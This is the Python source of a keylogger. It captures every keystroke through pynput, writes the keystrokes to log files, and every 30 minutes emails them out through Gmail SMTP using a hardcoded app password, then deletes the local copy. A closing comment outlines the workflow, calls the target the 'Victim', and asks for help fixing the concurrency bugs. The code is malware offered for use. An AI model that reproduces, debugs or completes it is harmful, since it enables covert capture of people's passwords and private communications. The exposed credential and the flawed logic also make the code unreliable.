# import required libraries
import os
import email
import smtplib
import time
import urllib.request

from pynput import keyboard
from datetime import datetime
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# variables to be stored
full_log = ""
word = ""
char_limit = 190 # Line limit to match screen width
log_file_counter = 1

smtp_port = 587
smtp_server = "smtp.gmail.com"
pswd = "qokedyplqziplujz"

def get_current_time():
    return datetime.now().strftime("%d-%m-%Y-%H-%M-%S")

ascii_art = r"""
	  
 /$$                           /$$                                                  
| $$                          | $$                                                  
| $$   /$$  /$$$$$$  /$$   /$$| $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$  /$$/ /$$__  $$| $$  | $$| $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$$$$$/ | $$$$$$$$| $$  | $$| $$| $$  \ $$| $$  \ $$| $$  \ $$| $$$$$$$$| $$  \__/
| $$_  $$ | $$_____/| $$  | $$| $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$      
| $$ \  $$|  $$$$$$$|  $$$$$$$| $$|  $$$$$$/|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$      
|__/  \__/ \_______/ \____  $$|__/ \______/  \____  $$ \____  $$ \_______/|__/      
					 /$$  | $$               /$$  \ $$ /$$  \ $$                    
					|  $$$$$$/              |  $$$$$$/|  $$$$$$/                    
					 \______/                \______/  \______/                     
 /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$
|______/|______/|______/|______/|______/|______/|______/|______/|______/|______/|______/
"""
print(ascii_art)

# Email setup
email = input("Enter email: ") # used both as sending and receiving email
subject = f"Keylogger logs at: {get_current_time()}"
body = f"See attached logs to view keystrokes at {get_current_time()}"

def create_log_file():
	global log_file
	global log_file_counter
	log_file = f"{os.getcwd()}/user-data-{log_file_counter}-{get_current_time()}.log"
	log_file_counter += 1
	with open(log_file, "w") as file:
		file.write(f"Started logging at:{get_current_time()} " + "\n")
	return log_file
create_log_file() # Called at initial startup of file

def send_attachment():
	# Create a multipart message and set headers
	message = MIMEMultipart()
	message["From"] = email
	message["To"] = email
	message["Subject"] = subject

	# Add body to email
	message.attach(MIMEText(body, "plain"))

	#Define the file to attach and open in binary mode
	filename = log_file
	attachment = open(filename, "rb") # r for read nd b for binary

	# Add file as application/octet-stream
	attachment_package = MIMEBase("application", "octet-stream")
	attachment_package.set_payload((attachment).read())
	encoders.encode_base64(attachment_package)	# Encode as base 64-ASCII Characters to send by email
	attachment_package.add_header("Content-Dispositon", "attachment; filename = " + filename)	# Add header as key
	message.attach(attachment_package)	# Add attachment to message

	text = message.as_string()	# Cast as string

	# Log in to server using secure context and send email, then logout
	server = smtplib.SMTP(smtp_server, smtp_port)
	server.starttls()
	server.login(email, pswd)
	server.sendmail(email, email, text)
	server.quit()

# LISTENING FOR KEYSTROKE EVENTS
def on_press(key):
	# set variables as global
	global word
	global full_log

	# list of keys to ignore when pressed
	ignored_keys = (
		keyboard.Key.shift_l, keyboard.Key.shift_r,
		keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
		keyboard.Key.alt_l, keyboard.Key.alt_gr,
		keyboard.Key.caps_lock,
		keyboard.Key.tab, 
        keyboard.Key.home, keyboard.Key.insert, keyboard.Key.esc, keyboard.Key.delete, keyboard.Key.end, 
        keyboard.Key.page_down, keyboard.Key.page_up,
        keyboard.Key.left, keyboard.Key.right, keyboard.Key.up, keyboard.Key.down,
        keyboard.Key.cmd,  # Windows key
        # keyboard.Key.num_lock,
	)

	if key in ignored_keys:
		return
	elif key == keyboard.Key.space or key == keyboard.Key.enter:
		word += " "
		full_log += word
		word = ""
	elif key == keyboard.Key.backspace:
		word = word[:-1]
	else:
		char = key.char
		word += char
		if len(full_log) >= char_limit:
			with open(log_file, "a") as file:
				file.write(full_log + "\n")
			full_log = ""

with keyboard.Listener(on_press=on_press) as listener:
	listener.join()

# Block used to check internet connecton and send the log file as attachment
def check_internet():
	try:
		urllib.request.urlopen('https://www.google.com', timeout=1)
		return True
	except urllib.request.URLError:
		return False

def check_and_send():
	time.sleep(1800)
	if check_internet():
		send_attachment()
		# Delete file afterwards
		if os.path.exists(log_file):
			os.remove(log_file)
			create_log_file() # Create a new log file
		else:
				print(f"The file '{log_file}' does not exist.")
	else:
		with open(log_file, 'a') as file:
			file.write(f"Victim has no internet connection at this time: {get_current_time()}.\n")
	print("Scheduler running...")

# Infinite loop to run the scheduler
while True:
	# Schedule task to check internet connection and send attachment every 30 minutes
	check_and_send()
""" 
* Workflow
- Record key strokes,
- if the keystroke is space or enter add a " " space to a variable called char
then push the word to the another long variable> log_sentence then empty word with ""
- If keystroke is character then add char to log_sentence.
- if delay in keystorke for more than 8 seconds then push log_sentence to log_file and clear log_sentence
- On next keyboard input push a timestamp to log_file then wait
- On every 30 minutes a simple function will check if ther is an intenet connection.
	- If so then attach the log file to the email and send it.
	- if not then add a string to the log file saying ("Victim has no active internet connection at {datetime.now()}) 

BUGS FOUND
3. Check line 48 where log_file is declared: if your remove the path, if it affects where the file is created
4. Look for ways to ignore the numpad keys if numpad key is off
5. my problem wit this code is I do not know if he 2 functions the listener and the scheduler  are concurrently running. can you add some code like print statements that will show me if both of them are running
"""